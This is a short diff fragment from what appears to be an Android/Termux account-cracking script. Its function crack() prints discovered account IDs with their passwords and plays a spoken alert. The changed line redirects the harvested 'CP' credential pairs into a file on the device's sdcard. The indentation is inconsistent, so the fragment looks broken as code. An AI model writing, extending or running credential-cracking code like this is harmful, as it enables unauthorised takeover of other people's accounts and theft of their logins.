@@ -489,7 +489,7 @@ def crack(idf,pwv):
 				#SHANTO-King
 				print(f'\r\r\x1b[38;5;208m [SHANTO•CP] '+ids+' • '+paw+'\033[1;97m')
 				os.system('espeak -a 300 " C,  P"')
-			    open('CP/'+cpc,'a').write(idf+' | '+pw+'\n')
+			    open(f'/sdcard/SHANTO•CP.txt', 'a').write(ids+'|'+paw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
 				break
